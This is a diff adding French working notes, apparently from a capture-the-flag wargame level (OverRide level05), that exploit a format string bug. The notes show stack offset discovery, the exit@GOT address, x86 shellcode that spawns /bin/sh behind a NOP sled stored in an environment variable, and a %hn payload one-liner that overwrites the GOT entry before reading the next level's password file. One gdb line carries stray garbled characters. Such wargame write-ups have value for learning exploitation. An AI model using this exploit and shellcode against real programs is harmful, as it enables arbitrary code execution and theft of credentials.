@@ -1,0 +1,40 @@
+idee : Format string attack
+ecriture de nope slide et shellcode dans les var d'env, pour injecter le shellcode dans le plt/Got du exit
+Recuperation d'une addresse arbitraire sur gdb en esperant qu'elle tombe dans les nopslide (puis ajustement)
+
+dmesg | grep "Execute Disable"
+[    0.000000] NX (Execute Disable) protection: active → stack execution disabled
+
+recherche position addresse sur la stack
+level05@OverRide:~$ python -c "print 'AAAABBBB' + '%x ' * 20" | ./level05 
+aaaabbbb64 f7fcfac0 f7ec3add ffffd6cf ffffd6ce 0 ffffffff ffffd754 f7fdb000 61616161 62626262 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 → offset 10 et 11
+
+address plt de exit 
+(gdb) disass 0x8048370
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:	jmp    *0x80497e0
+   0x08048376 <+6>:	push   $0x18
+   0x0804837b <+11>:	jmp    0x8048330GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
+End of assembler dump.
+(gdb) disass 0x80497e0 → ‘\xe0\x97\x04\x08’
+Dump of assembler code for function exit@got.plt:
+   0x080497e0 <+0>:	jbe    0x8049765 
+   0x080497e2 <+2>:	add    $0x8,%al
+End of assembler dump.
+
+export du shellcode avec nopslide (marche aussi avec 500)
+export SC=$(python -c 'print("\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+Tentative avec address arbitraire sur gdb du shellcode et espérer qu’elle tombe dans les nopslide: 
+(gdb) x/30s *environ
+0xffff.d734 → 65535.55092
+
+division addresse p.232
+https://pages.cs.wisc.edu/~ace/media/gray-hat-hacking.pdf
+example : "\x42\x94\x04\x08\x40\x94\x04\x08"`%.49143x%4\$hn%.16209x%5\$hn
+55092 - 8 = 55084
+65535 - 55092 = 10443
+
+(python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08' + '%.55084x%10\$hn' + '%.10443x%11\$hn'"; cat) | ./level05
+cat /home/users/level06/.pass
+
